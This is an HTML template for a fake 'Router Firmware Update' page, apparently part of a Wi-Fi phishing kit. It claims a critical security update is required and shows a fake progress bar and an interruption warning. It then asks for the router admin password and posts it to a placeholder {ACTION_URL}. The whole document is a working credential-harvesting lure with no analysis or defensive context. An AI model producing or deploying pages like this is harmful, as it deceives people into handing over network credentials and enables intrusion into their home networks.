<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Router Firmware Update</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.15);padding:30px;max-width:400px;width:90%;text-align:center}
.logo{font-size:48px;margin-bottom:10px}
h2{color:#1a1a1a;margin-bottom:8px;font-size:22px}
p{color:#666;font-size:14px;margin-bottom:20px;line-height:1.5}
.progress{background:#e0e0e0;border-radius:20px;height:8px;margin-bottom:20px;overflow:hidden}
.progress-bar{background:#e99f00;height:8px;width:65%;border-radius:20px;animation:pulse 2s infinite}
@keyframes pulse{0%{opacity:1}50%{opacity:.6}100%{opacity:1}}
.warning{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:10px;font-size:13px;color:#856404;margin-bottom:20px}
label{display:block;text-align:left;font-size:13px;color:#555;margin-bottom:4px}
input[type=password]{width:100%;padding:10px 14px;border:1px solid #ddd;border-radius:6px;font-size:15px;margin-bottom:16px}
input[type=password]:focus{outline:0;border-color:#e99f00;box-shadow:0 0 0 2px rgba(233,159,0,.2)}
button{width:100%;padding:12px;background:#e99f00;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:bold;cursor:pointer}
button:hover{background:#d48e00}
</style>
</head>
<body>
<div class="card">
<div class="logo">&#9881;</div>
<h2>Firmware Update Required</h2>
<p>Your router firmware is outdated. A critical security update is needed to continue using the internet.<br>Enter your router admin password to proceed with the update.</p>
<div class="progress"><div class="progress-bar"></div></div>
<div class="warning">&#9888; Connection will be interrupted briefly during update</div>
<form method="POST" action="{ACTION_URL}">
<label for="password">Router Admin Password</label>
<input type="password" id="password" name="password" placeholder="Enter your router password" required>
<button type="submit">Continue Update</button>
</form>
</div>
</body>
</html>
